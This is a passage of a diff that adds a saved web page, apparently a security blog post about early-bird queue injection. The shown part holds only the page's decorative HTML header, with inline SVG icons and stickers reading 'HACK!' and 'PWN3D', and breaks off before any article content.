@@ -1,0 +1,478 @@
+# https://at0mxploit.xyz/post/queue-early-bird-injection
+
+<!DOCTYPE html><html lang="en">
+  <body>
+    <div id="root"><div class="min-h-screen bg-black text-gray-100 relative overflow-hidden"><div class="fixed inset-0 bg-gradient-to-br from-pink-950/20 via-black to-blue-950/20 pointer-events-none"></div><div class="fixed top-20 right-10 w-96 h-96 bg-pink-500/10 rounded-full blur-3xl animate-pulse pointer-events-none"></div><div class="fixed bottom-20 left-10 w-96 h-96 bg-blue-500/10 rounded-full blur-3xl animate-pulse pointer-events-none" style="animation-delay: 1s;"></div><main class="relative z-10"><section class="min-h-screen flex items-center justify-center px-6 pt-32 pb-20 relative overflow-hidden" aria-hidden="true"><div class="absolute top-20 left-[5%] w-64 h-64 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div><div class="absolute top-40 right-[10%] w-48 h-48 bg-blue-500/20 rounded-full blur-2xl animate-pulse" style="animation-delay: 0.5s;"></div><div class="absolute bottom-32 left-[15%] w-56 h-56 bg-purple-500/20 rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div><div class="absolute top-1/2 right-[5%] w-72 h-72 bg-yellow-500/15 rounded-full blur-3xl animate-pulse" style="animation-delay: 1.5s;"></div><div class="absolute bottom-[15%] right-[30%] w-60 h-60 bg-green-500/15 rounded-full blur-3xl animate-pulse" style="animation-delay: 2s;"></div><svg class="absolute top-28 left-[12%] w-40 h-40 text-pink-400/30 animate-float" viewBox="0 0 100 100"><path d="M 20 50 Q 30 20, 50 40 T 80 50 Q 60 70, 40 60 T 20 50" stroke="currentColor" stroke-width="4" fill="none" stroke-linecap="round"></path><circle cx="35" cy="45" r="3" fill="currentColor"></circle><circle cx="65" cy="45" r="3" fill="currentColor"></circle><path d="M 30 55 Q 50 65, 70 55" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round"></path></svg><svg class="absolute bottom-40 right-[8%] w-36 h-36 text-blue-400/20 animate-spin-slow" viewBox="0 0 100 100"><path d="M 50 10 L 60 40 L 90 40 L 65 60 L 75 90 L 50 70 L 25 90 L 35 60 L 10 40 L 40 40 Z" stroke="currentColor" stroke-width="3" fill="none"></path></svg><div class="absolute top-1/3 right-[20%] animate-bounce-crazy"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-orange'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-orange)'%3e%3c!--%20Main%20flame%20--%3e%3cpath%20d='M%2050%2085%20Q%2035%2075,%2035%2060%20Q%2035%2045,%2045%2035%20Q%2045%2025,%2050%2015%20Q%2055%2025,%2055%2035%20Q%2065%2045,%2065%2060%20Q%2065%2075,%2050%2085%20Z'%20stroke='%23ff6600'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Inner%20flame%20--%3e%3cpath%20d='M%2050%2075%20Q%2042%2068,%2042%2058%20Q%2042%2048,%2050%2035%20Q%2058%2048,%2058%2058%20Q%2058%2068,%2050%2075%20Z'%20stroke='%23ffaa00'%20stroke-width='2.5'%20fill='none'%20opacity='0.8'%20stroke-linejoin='round'/%3e%3c!--%20Core%20--%3e%3cpath%20d='M%2050%2065%20Q%2046%2060,%2046%2054%20Q%2046%2048,%2050%2042%20Q%2054%2048,%2054%2054%20Q%2054%2060,%2050%2065%20Z'%20stroke='%23ffff00'%20stroke-width='2'%20fill='none'%20opacity='0.9'%20stroke-linejoin='round'/%3e%3c/g%3e%3c/svg%3e" alt="fire icon" class="neon-icon w-16 h-16 opacity-60"></div><div class="absolute bottom-1/4 left-[8%] animate-tilt"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-purple'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-purple)'%3e%3c!--%20Ghost%20body%20--%3e%3cpath%20d='M%2030%2040%20Q%2030%2020,%2050%2020%20Q%2070%2020,%2070%2040%20L%2070%2075%20L%2062%2068%20L%2054%2075%20L%2046%2068%20L%2038%2075%20L%2030%2068%20Z'%20stroke='%23b366ff'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Eyes%20--%3e%3ccircle%20cx='42'%20cy='38'%20r='4'%20fill='%23b366ff'%20opacity='0.8'%3e%3canimate%20attributeName='opacity'%20values='0.5;0.9;0.5'%20dur='2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3ccircle%20cx='58'%20cy='38'%20r='4'%20fill='%23b366ff'%20opacity='0.8'%3e%3canimate%20attributeName='opacity'%20values='0.5;0.9;0.5'%20dur='2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Mouth%20--%3e%3cpath%20d='M%2042%2050%20Q%2050%2054,%2058%2050'%20stroke='%23b366ff'%20stroke-width='2.5'%20fill='none'%20stroke-linecap='round'/%3e%3c/g%3e%3c/svg%3e" alt="ghost icon" class="neon-icon w-14 h-14 opacity-50"></div><div class="absolute top-[18%] left-[35%] animate-float"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-red'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-red)'%3e%3c!--%20Fuse%20--%3e%3cpath%20d='M%2055%2020%20Q%2060%2015,%2062%2012'%20stroke='%23ff3333'%20stroke-width='2.5'%20fill='none'%20stroke-linecap='round'/%3e%3c!--%20Spark%20--%3e%3ccircle%20cx='63'%20cy='10'%20r='3'%20fill='%23ffff00'%20opacity='0.8'%3e%3canimate%20attributeName='opacity'%20values='0.4;1;0.4'%20dur='0.5s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3cline%20x1='60'%20y1='8'%20x2='58'%20y2='5'%20stroke='%23ffff00'%20stroke-width='1.5'%20opacity='0.8'/%3e%3cline%20x1='66'%20y1='8'%20x2='68'%20y2='5'%20stroke='%23ffff00'%20stroke-width='1.5'%20opacity='0.8'/%3e%3cline%20x1='65'%20y1='12'%20x2='68'%20y2='14'%20stroke='%23ffff00'%20stroke-width='1.5'%20opacity='0.8'/%3e%3c!--%20Bomb%20body%20--%3e%3ccircle%20cx='50'%20cy='55'%20r='30'%20stroke='%23ff3333'%20stroke-width='3'%20fill='none'/%3e%3c!--%20Highlight%20--%3e%3cpath%20d='M%2035%2040%20Q%2040%2035,%2045%2038'%20stroke='%23ff6666'%20stroke-width='2'%20fill='none'%20stroke-linecap='round'%20opacity='0.7'/%3e%3c/g%3e%3c/svg%3e" alt="bomb icon" class="neon-icon w-10 h-10 opacity-45"></div><div class="absolute bottom-[30%] right-[25%] animate-wiggle"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-cat-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-cat-glow)'%3e%3c!--%20Ears%20--%3e%3cpath%20d='M%2022%2038%20L%2028%2015%20L%2038%2032'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3cpath%20d='M%2078%2038%20L%2072%2015%20L%2062%2032'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Inner%20ears%20--%3e%3cpath%20d='M%2026%2034%20L%2030%2020%20L%2036%2032'%20stroke='%23ff66b3'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'%20stroke-linejoin='round'/%3e%3cpath%20d='M%2074%2034%20L%2070%2020%20L%2064%2032'%20stroke='%23ff66b3'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'%20stroke-linejoin='round'/%3e%3c!--%20Head%20--%3e%3cellipse%20cx='50'%20cy='50'%20rx='28'%20ry='24'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'/%3e%3c!--%20X%20eyes%20(kawaii%20dead/chaos%20eyes)%20--%3e%3cg%20stroke='%23ff0080'%20stroke-width='2.5'%20stroke-linecap='round'%3e%3cline%20x1='36'%20y1='42'%20x2='44'%20y2='50'/%3e%3cline%20x1='44'%20y1='42'%20x2='36'%20y2='50'/%3e%3cline%20x1='56'%20y1='42'%20x2='64'%20y2='50'/%3e%3cline%20x1='64'%20y1='42'%20x2='56'%20y2='50'/%3e%3c/g%3e%3c!--%20Nose%20--%3e%3cpath%20d='M%2048%2055%20L%2050%2058%20L%2052%2055'%20stroke='%23ff0080'%20stroke-width='2'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Mouth%20(w%20shape%20%E2%80%94%20kawaii%20cat%20mouth)%20--%3e%3cpath%20d='M%2040%2060%20Q%2045%2065,%2050%2060%20Q%2055%2065,%2060%2060'%20stroke='%23ff0080'%20stroke-width='2'%20fill='none'%20stroke-linecap='round'/%3e%3c!--%20Whiskers%20--%3e%3cline%20x1='20'%20y1='52'%20x2='35'%20y2='55'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='20'%20y1='58'%20x2='35'%20y2='58'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='65'%20y1='55'%20x2='80'%20y2='52'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='65'%20y1='58'%20x2='80'%20y2='58'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3c/g%3e%3c/svg%3e" alt="cat icon" class="neon-icon w-14 h-14 opacity-55"></div><div class="absolute top-[45%] left-[18%] animate-tilt"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-eye-glow'%3e%3cfeGaussianBlur%20stdDeviation='2.5'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-eye-glow)'%3e%3c!--%20Outer%20eye%20shape%20--%3e%3cpath%20d='M%2010%2050%20Q%2030%2025,%2050%2025%20Q%2070%2025,%2090%2050%20Q%2070%2075,%2050%2075%20Q%2030%2075,%2010%2050%20Z'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Iris%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='15'%20stroke='%23ff0080'%20stroke-width='2.5'%20fill='none'/%3e%3c!--%20Pupil%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='7'%20fill='%23ff0080'%20opacity='0.7'%3e%3canimate%20attributeName='r'%20values='7;5;7'%20dur='3s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Pupil%20slit%20(vertical%20%E2%80%94%20cat/Jinx%20style)%20--%3e%3cellipse%20cx='50'%20cy='50'%20rx='2'%20ry='12'%20fill='%230a0a0f'%20opacity='0.9'%3e%3canimate%20attributeName='ry'%20values='12;8;12'%20dur='3s'%20repeatCount='indefinite'/%3e%3c/ellipse%3e%3c!--%20Iris%20detail%20lines%20--%3e%3cline%20x1='50'%20y1='36'%20x2='50'%20y2='40'%20stroke='%23ff66b3'%20stroke-width='1'%20opacity='0.5'/%3e%3cline%20x1='50'%20y1='60'%20x2='50'%20y2='64'%20stroke='%23ff66b3'%20stroke-width='1'%20opacity='0.5'/%3e%3cline%20x1='36'%20y1='50'%20x2='40'%20y2='50'%20stroke='%23ff66b3'%20stroke-width='1'%20opacity='0.5'/%3e%3cline%20x1='60'%20y1='50'%20x2='64'%20y2='50'%20stroke='%23ff66b3'%20stroke-width='1'%20opacity='0.5'/%3e%3c!--%20Highlight%20--%3e%3ccircle%20cx='44'%20cy='44'%20r='3'%20fill='%23ffffff'%20opacity='0.8'%3e%3canimate%20attributeName='opacity'%20values='0.6;1;0.6'%20dur='2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Lower%20lash%20accents%20--%3e%3cpath%20d='M%2022%2058%20L%2018%2064'%20stroke='%23ff0080'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.6'/%3e%3cpath%20d='M%2078%2058%20L%2082%2064'%20stroke='%23ff0080'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.6'/%3e%3cpath%20d='M%2030%2064%20L%2028%2070'%20stroke='%23ff0080'%20stroke-width='1.5'%20stroke-linecap='round'%20opacity='0.5'/%3e%3cpath%20d='M%2070%2064%20L%2072%2070'%20stroke='%23ff0080'%20stroke-width='1.5'%20stroke-linecap='round'%20opacity='0.5'/%3e%3c/g%3e%3c/svg%3e" alt="eye icon" class="neon-icon w-10 h-10 opacity-50"></div><div class="absolute bottom-[18%] left-[28%] animate-float" style="animation-delay: 1s;"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-potion-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-potion-glow)'%3e%3c!--%20Cork%20--%3e%3crect%20x='42'%20y='12'%20width='16'%20height='8'%20rx='2'%20stroke='%23b366ff'%20stroke-width='2'%20fill='none'/%3e%3c!--%20Neck%20--%3e%3cpath%20d='M%2044%2020%20L%2044%2032%20L%2030%2055%20Q%2025%2062,%2030%2072%20L%2030%2078%20Q%2030%2085,%2037%2085%20L%2063%2085%20Q%2070%2085,%2070%2078%20L%2070%2072%20Q%2075%2062,%2070%2055%20L%2056%2032%20L%2056%2020'%20stroke='%23b366ff'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Liquid%20level%20--%3e%3cpath%20d='M%2032%2062%20Q%2042%2058,%2050%2062%20Q%2058%2066,%2068%2062'%20stroke='%23b366ff'%20stroke-width='2'%20fill='none'%20opacity='0.8'/%3e%3c!--%20Bubbles%20--%3e%3ccircle%20cx='42'%20cy='72'%20r='3'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.8'%3e%3canimate%20attributeName='cy'%20values='72;65;72'%20dur='2s'%20repeatCount='indefinite'/%3e%3canimate%20attributeName='opacity'%20values='0.8;0.3;0.8'%20dur='2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3ccircle%20cx='55'%20cy='76'%20r='2'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.6'%3e%3canimate%20attributeName='cy'%20values='76;68;76'%20dur='2.5s'%20repeatCount='indefinite'/%3e%3canimate%20attributeName='opacity'%20values='0.6;0.2;0.6'%20dur='2.5s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3ccircle%20cx='48'%20cy='80'%20r='1.5'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.7'%3e%3canimate%20attributeName='cy'%20values='80;70;80'%20dur='1.8s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Sparkle%20on%20glass%20--%3e%3cpath%20d='M%2036%2042%20L%2038%2038%20L%2040%2042'%20stroke='%23ffffff'%20stroke-width='1.5'%20fill='none'%20opacity='0.6'%20stroke-linecap='round'/%3e%3c!--%20Skull%20label%20on%20bottle%20--%3e%3ccircle%20cx='50'%20cy='72'%20r='5'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'/%3e%3cline%20x1='48'%20y1='71'%20x2='48'%20y2='71'%20stroke='%23b366ff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.5'/%3e%3cline%20x1='52'%20y1='71'%20x2='52'%20y2='71'%20stroke='%23b366ff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.5'/%3e%3cpath%20d='M%2048%2075%20L%2050%2076%20L%2052%2075'%20stroke='%23b366ff'%20stroke-width='1'%20fill='none'%20opacity='0.4'/%3e%3c/g%3e%3c/svg%3e" alt="potion icon" class="neon-icon w-12 h-12 opacity-50"></div><div class="absolute top-[28%] right-[12%] animate-bounce-crazy" style="animation-delay: 0.5s;"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-cross-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-cross-glow)'%3e%3c!--%20Outer%20ring%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='35'%20stroke='%2300ffff'%20stroke-width='2.5'%20fill='none'%20stroke-dasharray='8,4'/%3e%3c!--%20Inner%20ring%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='18'%20stroke='%2300ffff'%20stroke-width='2'%20fill='none'/%3e%3c!--%20Center%20dot%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='3'%20fill='%2300ffff'%20opacity='0.9'%3e%3canimate%20attributeName='opacity'%20values='0.5;1;0.5'%20dur='1.2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Crosshair%20lines%20--%3e%3cline%20x1='50'%20y1='10'%20x2='50'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='50'%20y1='70'%20x2='50'%20y2='90'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='10'%20y1='50'%20x2='30'%20y2='50'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='70'%20y1='50'%20x2='90'%20y2='50'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3c!--%20Corner%20tick%20marks%20--%3e%3cline%20x1='25'%20y1='25'%20x2='30'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='75'%20y1='25'%20x2='70'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='25'%20y1='75'%20x2='30'%20y2='70'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='75'%20y1='75'%20x2='70'%20y2='70'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3c/g%3e%3c/svg%3e" alt="crosshair icon" class="neon-icon w-14 h-14 opacity-55"></div><div class="absolute top-[22%] left-[4%] animate-float" style="animation-delay: 2s;"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-cross-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-cross-glow)'%3e%3c!--%20Outer%20ring%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='35'%20stroke='%2300ffff'%20stroke-width='2.5'%20fill='none'%20stroke-dasharray='8,4'/%3e%3c!--%20Inner%20ring%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='18'%20stroke='%2300ffff'%20stroke-width='2'%20fill='none'/%3e%3c!--%20Center%20dot%20--%3e%3ccircle%20cx='50'%20cy='50'%20r='3'%20fill='%2300ffff'%20opacity='0.9'%3e%3canimate%20attributeName='opacity'%20values='0.5;1;0.5'%20dur='1.2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Crosshair%20lines%20--%3e%3cline%20x1='50'%20y1='10'%20x2='50'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='50'%20y1='70'%20x2='50'%20y2='90'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='10'%20y1='50'%20x2='30'%20y2='50'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3cline%20x1='70'%20y1='50'%20x2='90'%20y2='50'%20stroke='%2300ffff'%20stroke-width='2.5'%20stroke-linecap='round'/%3e%3c!--%20Corner%20tick%20marks%20--%3e%3cline%20x1='25'%20y1='25'%20x2='30'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='75'%20y1='25'%20x2='70'%20y2='30'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='25'%20y1='75'%20x2='30'%20y2='70'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3cline%20x1='75'%20y1='75'%20x2='70'%20y2='70'%20stroke='%2300ffff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.7'/%3e%3c/g%3e%3c/svg%3e" alt="crosshair icon" class="neon-icon w-10 h-10 opacity-40"></div><div class="absolute top-[55%] left-[5%] rotate-6"><div class="bg-purple-400 border-4 border-black px-3 py-2 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]"><p class="text-black font-black text-xs">0xDEAD</p></div></div><svg class="absolute top-[65%] left-[3%] w-28 h-28 text-pink-400/20" viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" stroke="currentColor" stroke-width="2" fill="none" stroke-dasharray="6,4"></circle><circle cx="50" cy="50" r="18" stroke="currentColor" stroke-width="1.5" fill="none" opacity="0.6"></circle><line x1="50" y1="15" x2="50" y2="30" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line><line x1="50" y1="70" x2="50" y2="85" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line><line x1="15" y1="50" x2="30" y2="50" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line><line x1="70" y1="50" x2="85" y2="50" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line></svg><div class="absolute bottom-[40%] left-[2%] animate-tilt"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-potion-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-potion-glow)'%3e%3c!--%20Cork%20--%3e%3crect%20x='42'%20y='12'%20width='16'%20height='8'%20rx='2'%20stroke='%23b366ff'%20stroke-width='2'%20fill='none'/%3e%3c!--%20Neck%20--%3e%3cpath%20d='M%2044%2020%20L%2044%2032%20L%2030%2055%20Q%2025%2062,%2030%2072%20L%2030%2078%20Q%2030%2085,%2037%2085%20L%2063%2085%20Q%2070%2085,%2070%2078%20L%2070%2072%20Q%2075%2062,%2070%2055%20L%2056%2032%20L%2056%2020'%20stroke='%23b366ff'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Liquid%20level%20--%3e%3cpath%20d='M%2032%2062%20Q%2042%2058,%2050%2062%20Q%2058%2066,%2068%2062'%20stroke='%23b366ff'%20stroke-width='2'%20fill='none'%20opacity='0.8'/%3e%3c!--%20Bubbles%20--%3e%3ccircle%20cx='42'%20cy='72'%20r='3'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.8'%3e%3canimate%20attributeName='cy'%20values='72;65;72'%20dur='2s'%20repeatCount='indefinite'/%3e%3canimate%20attributeName='opacity'%20values='0.8;0.3;0.8'%20dur='2s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3ccircle%20cx='55'%20cy='76'%20r='2'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.6'%3e%3canimate%20attributeName='cy'%20values='76;68;76'%20dur='2.5s'%20repeatCount='indefinite'/%3e%3canimate%20attributeName='opacity'%20values='0.6;0.2;0.6'%20dur='2.5s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3ccircle%20cx='48'%20cy='80'%20r='1.5'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.7'%3e%3canimate%20attributeName='cy'%20values='80;70;80'%20dur='1.8s'%20repeatCount='indefinite'/%3e%3c/circle%3e%3c!--%20Sparkle%20on%20glass%20--%3e%3cpath%20d='M%2036%2042%20L%2038%2038%20L%2040%2042'%20stroke='%23ffffff'%20stroke-width='1.5'%20fill='none'%20opacity='0.6'%20stroke-linecap='round'/%3e%3c!--%20Skull%20label%20on%20bottle%20--%3e%3ccircle%20cx='50'%20cy='72'%20r='5'%20stroke='%23b366ff'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'/%3e%3cline%20x1='48'%20y1='71'%20x2='48'%20y2='71'%20stroke='%23b366ff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.5'/%3e%3cline%20x1='52'%20y1='71'%20x2='52'%20y2='71'%20stroke='%23b366ff'%20stroke-width='2'%20stroke-linecap='round'%20opacity='0.5'/%3e%3cpath%20d='M%2048%2075%20L%2050%2076%20L%2052%2075'%20stroke='%23b366ff'%20stroke-width='1'%20fill='none'%20opacity='0.4'/%3e%3c/g%3e%3c/svg%3e" alt="potion icon" class="neon-icon w-9 h-9 opacity-35"></div><div class="absolute top-[15%] left-[25%] -rotate-12 animate-wiggle"><div class="bg-yellow-400 border-4 border-black px-3 py-2 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]"><p class="text-black font-black text-sm">HACK!</p></div></div><div class="absolute top-[20%] right-[22%] rotate-12 animate-float"><div class="bg-pink-400 border-4 border-black px-3 py-2 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-pink'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3c!--%20Neon%20skull%20--%3e%3cg%20filter='url(%23neon-pink)'%3e%3c!--%20Head%20--%3e%3cellipse%20cx='50'%20cy='45'%20rx='25'%20ry='28'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'/%3e%3c!--%20Eyes%20--%3e%3cellipse%20cx='40'%20cy='40'%20rx='6'%20ry='8'%20stroke='%23ff0080'%20stroke-width='2.5'%20fill='%23ff0080'%20opacity='0.6'/%3e%3cellipse%20cx='60'%20cy='40'%20rx='6'%20ry='8'%20stroke='%23ff0080'%20stroke-width='2.5'%20fill='%23ff0080'%20opacity='0.6'/%3e%3c!--%20Nose%20--%3e%3cpath%20d='M%2047%2050%20L%2050%2055%20L%2053%2050%20Z'%20stroke='%23ff0080'%20stroke-width='2.5'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Jaw%20--%3e%3cpath%20d='M%2030%2060%20Q%2050%2075,%2070%2060'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'/%3e%3c!--%20Teeth%20--%3e%3cline%20x1='40'%20y1='60'%20x2='40'%20y2='68'%20stroke='%23ff0080'%20stroke-width='2'/%3e%3cline%20x1='47'%20y1='60'%20x2='47'%20y2='70'%20stroke='%23ff0080'%20stroke-width='2'/%3e%3cline%20x1='53'%20y1='60'%20x2='53'%20y2='70'%20stroke='%23ff0080'%20stroke-width='2'/%3e%3cline%20x1='60'%20y1='60'%20x2='60'%20y2='68'%20stroke='%23ff0080'%20stroke-width='2'/%3e%3c/g%3e%3c/svg%3e" alt="skull icon" class="neon-icon w-8 h-8"></div></div><div class="absolute bottom-[25%] right-[15%] -rotate-6"><div class="bg-blue-400 border-4 border-black px-4 py-2 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]"><p class="text-black font-black text-xs">PWN3D</p></div></div><div class="max-w-4xl mx-auto text-center relative z-10"><svg class="absolute -inset-32 w-[calc(100%+16rem)] h-[calc(100%+16rem)] pointer-events-none" viewBox="0 0 200 200" 